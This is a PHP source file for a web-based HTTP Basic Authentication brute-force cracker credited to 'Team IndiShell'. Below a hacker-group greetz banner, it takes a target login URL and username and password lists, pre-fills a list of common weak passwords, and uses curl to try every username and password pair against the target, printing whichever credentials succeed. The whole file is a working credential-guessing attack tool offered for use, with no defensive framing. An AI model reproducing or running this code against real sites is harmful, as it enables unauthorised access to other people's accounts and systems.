<?php


$head = '<html>
<title>--==[[Http basic authentication cracker by Team InidiShell]]==--</title><STYLE>
body {
    font-family: Tahoma
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: white;
width: 40%;
color: white;
}
input {
border			: solid 2px;
border-color		: #333;
BACKGROUND-COLOR: black;
font: 10pt comic sans ms;
color: white;
}
</STYLE>'; ?>
<html>
	<head>
		<?php 
		echo $head ;
		echo '
<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >

			

<td width="100%" align=center valign="top" rowspan="1">
<font color=#ff9933 size=4 face="comic sans ms"><b>--==[[ Http basic </font><font color=white size=4 face="comic sans ms"><b>authentication cracker by</font><font color=green size=4 face="comic sans ms"><b> Team IndiShell ]]==--</font> 
<body bgcolor=black>
<div align=center>
<table width="100%" cellspacing="0" cellpadding="0"  style="border: dashed 2px #333">
<td height="10" align="left" ></td></tr><tr><td
width="100%" align="center" valign="top" rowspan="1"><font color="red" face="comic sans ms"size="1">

<font color=#ff9933 size=1>
################################################</font><font color=white size=1>################################################</font><font color=green size=1>################################################</font><br><font color=white>-==[[Greetz to]]==--</font><br> <font color=#ff9933>Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba ,Silent poison India,Magnum sniper,Atul Dwivedi,ethicalnoob Indishell,Local root indishell,Irfninja indishell<br>Reborn India,L0rd Crus4d3r,cool toad,cool shavik,Hackuin,Alicks,Ebin V Thomas,Dinelson Amine,Th3 D3str0yer,SKSking,Mr. Trojan,rad paul,Godzila,mike waals,zoo,cyber warrior,Neo hacker ICA<br>Suriya Prakash,cyber gladiator,Cyber Ace, Golden boy INDIA,Ketan Singh,Yash,Aneesh Dogra,AR AR,saad abbasi,hero,Minhal Mehdi ,Raj bhai ji , Hacking queen ,lovetherisk,brown suger and rest of TEAM INDISHELL<br>
<font color=white>--==[[Love to]]==--</font><br># My Father , my Ex Teacher,cold fire hacker,Mannu, ViKi ,Ashu bhai ji,Soldier Of God, Bhuppi,Mohit, Ffe ^_^,Ashish,Shardhanand ,Budhaoo,Anju and Deepika<br>
<font color=white>--==[[Interface Desgined By]]==--</font><br><font color=red>GCE College ke DON :D</font><br><font color=#ff9933>
################################################</font><font color=white>#################################################</font><font color=green>################################################</font>
           </table>
        
</table>
'; 
?>
 
<div align=center><font size=4 color=white>
<font size=3 color=white face="comic sans ms"><img src="http://www.freesmileys.org/smileys/smiley-cool21.gif"> --==[[ code for India,Hack for India,Die for India ]]==-- <img src="http://www.freesmileys.org/smileys/smiley-flag010.gif"></font><br><font color=white font size=3 face="comic sans ms"><marquee behavior="scroll" direction="left" scrollamount="2" scrolldelay="30" width="70%"><span class="footerlink">love happen only once.....Rest is life......</span></marquee><br></font></div><br><font size=3>

<div align=center><form method=post>
	<font color=#ff9933 size=3 face="comic sans ms">
	page Link--> <input type=text name=target value="website.com/login.php">
	
	</form><font color=#ff9933 size=2 face="comic sans ms"><table width=30%><td align=center ><font color=#ff9933 size=2 face="comic sans ms">username list</font></td><td align=center><font color=#ff9933 size=2 face="comic sans ms">passwords list</font></td></table>
	<textarea style="background:black;color:white" rows=20 cols=25 name=usernames  >
	</textarea>

<textarea style="background:black;color:white" rows=20 cols=25 name=passwords><?php echo "123\n1234\n123123\n12345\n123456\n1234567\n12345678\n123456789\n1234567890\n123abc\n1234abcd\nadmin\nadminadmin\nadministrator\nadmin123\nadmin1234\nadminabc\nqwerty\nabc123\nabcd1234\n098765";?></textarea><br><br>
	<input type=submit name=cracking value="lets hex this shit XD" /></form><br><br>
<?php

error_reporting(0);
set_time_limit(0);
function any($host,$user,$pass){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "$host");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT,3);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 0 ){
echo "<table width=100% ><tr><td align=center><b><font color=white size=2>=======================</font><font color=red size=2>cracked with username $user </font><font color=white size=2> </font><font color=red size=2>and password $pass </font> <font color=white size=2>=======================</font></b></td></tr></table>";


}
curl_close($ch);

}

if(isset($_POST['cracking']))
{
$userl=$_POST['usernames'];
$passl=$_POST['passwords'];
$target = trim($_POST['target']);
echo "brute forcing link $target ";
$userlist=explode("\n",$userl);
    $passlist=explode("\n",$passl);
	foreach ($userlist as $user) {
echo "<table width=80% ><tr><td align=center><b><font color=white size=2>Trying with username $user </font></td></tr></table>";
$finaluser = trim($user);
foreach ($passlist as $password ) {
$finalpass = trim($password);
any($target,$finaluser,$finalpass,$connect_timeout);
}
}
	}


?>